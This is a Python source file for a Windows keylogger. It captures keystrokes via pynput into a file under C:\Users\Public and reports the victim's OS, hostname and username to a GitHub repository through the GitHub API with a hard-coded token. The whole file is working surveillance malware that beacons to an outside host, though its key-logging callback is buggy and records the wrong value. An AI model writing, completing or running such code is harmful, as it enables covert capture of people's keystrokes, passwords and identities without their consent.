from pynput.keyboard import Key, Listener
import logging
import os
import socket
import platform
import requests
import base64
import getpass
import datetime


class Keylogger():
    def __init__(self, script_name):
        self.script_name = script_name
    
    def Run_Keylogger(self):
        '''Beschrijving'''
        keylogger_path = r"C:\Users\Public\keylogger"
        if not os.path.exists(keylogger_path):
            os.makedirs(keylogger_path)        
        log_dir = ""
        logging.basicConfig(filename=(log_dir + r"C:\Users\Public\keylogger\keylogs.txt"), \
	        level=logging.DEBUG, format='%(asctime)s: %(message)s')
        
        items = items = os.listdir(r"C:\Users\Public")
        folder_exists = False
        for item in items:
            item_path = os.path.join(r"C:\Users\Public", item)
            if os.path.isdir(item_path) and item == "keylogger":
                folder_exists = True
                pass
        if folder_exists:
            file_creator.create_file("logs", keylogger.script_name,"Script completed successfully")
        else:
            file_creator.create_file("logs",keylogger.script_name,"Script may have encountered erros")

        def on_press(key):
            logging.info(str(Key))
        
        with Listener(on_press=on_press) as listener:
            listener.join()

	


class Log():
    def __init__(self, repository_owner, repository_name, access_token):
        self.repository_owner = repository_owner
        self.repository_name = repository_name
        self.access_token = access_token

    def create_file(self, folder_path, script_name,status):
        # Get the current date and time
        current_datetime = datetime.datetime.now()   

        content = f"Script Name: {script_name}.\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()

        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username

        url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{folder_path}/{filename}"
        headers = {
            'Authorization': f'token {self.access_token}',
            'Accept': 'application/vnd.github.v3+json'
        }

        # Check if the file already exists
        existing_file_url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{folder_path}/{filename}"
        existing_file_response = requests.get(existing_file_url, headers=headers)
        
        if existing_file_response.status_code == 200:
            # File exists, append the new message to existing content
            existing_file_data = existing_file_response.json()
            sha = existing_file_data['sha']
            existing_content = base64.b64decode(existing_file_data['content']).decode()
            new_content = existing_content + '\n' + content

            data = {
                'message': 'Update log',
                'content': base64.b64encode(new_content.encode()).decode(),
                'sha': sha
            }

            response = requests.put(url, headers=headers, json=data)
            if response.status_code == 200:
                print("File updated successfully.")
            else:
                print("Failed to update file:", response.text)
        elif existing_file_response.status_code == 404:
            # File doesn't exist, create a new file
            data = {
                'message': 'New log',
                'content': base64.b64encode(content.encode()).decode()
            }

            response = requests.put(url, headers=headers, json=data)
            if response.status_code == 201:
                print("File created successfully.")
            else:
                print("Failed to create file:", response.text)
        else:
            print("Failed to check file existence:", existing_file_response.text)
	
	
repository_owner = 'rsecurity12' 
repository_name = 'invoice' 
access_token = 'sssd'  
file_creator = Log(repository_owner, repository_name, access_token)
keylogger = Keylogger("Keylogger")
keylogger.Run_Keylogger()

